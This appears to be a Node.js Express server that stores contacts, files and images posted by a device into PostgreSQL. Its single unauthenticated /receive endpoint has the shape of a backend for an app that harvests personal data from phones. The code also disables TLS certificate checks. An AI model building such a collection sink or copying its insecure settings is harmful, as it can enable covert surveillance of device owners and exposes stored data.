const express = require("express");
const { Pool } = require("pg");

const app = express();
app.use(express.json());

// PostgreSQL connection
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: {
    rejectUnauthorized: false
  }
});

// Create tables
async function initDB() {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS contacts (
        id SERIAL PRIMARY KEY,
        device_id TEXT,
        contact_data TEXT,
        timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);

    await pool.query(`
      CREATE TABLE IF NOT EXISTS files (
        id SERIAL PRIMARY KEY,
        device_id TEXT,
        file_data TEXT,
        timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);

    await pool.query(`
      CREATE TABLE IF NOT EXISTS images (
        id SERIAL PRIMARY KEY,
        device_id TEXT,
        image_data TEXT,
        timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);

    console.log("Tables created successfully");
  } catch (err) {
    console.error("Error creating tables:", err);
  }
}

initDB();

// API endpoint
app.post("/receive", async (req, res) => {
  const type = req.query.type;
  const data = JSON.stringify(req.body);
  const device = "device1";

  try {
    if (type === "contacts") {
      await pool.query(
        "INSERT INTO contacts (device_id, contact_data) VALUES ($1, $2)",
        [device, data]
      );
    } else if (type === "files") {
      await pool.query(
        "INSERT INTO files (device_id, file_data) VALUES ($1, $2)",
        [device, data]
      );
    } else if (type === "images") {
      await pool.query(
        "INSERT INTO images (device_id, image_data) VALUES ($1, $2)",
        [device, data]
      );
    } else {
      return res.status(400).send("Invalid type");
    }

    res.send("Data received successfully");
  } catch (err) {
    console.error(err);
    res.status(500).send("Error storing data");
  }
});

// ROOT route (for testing in browser)
app.get("/", (req, res) => {
  res.send("Backend is running 🚀");
});

// ✅ FIXED PORT (IMPORTANT FOR RENDER)
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("Server running on port " + PORT);
});
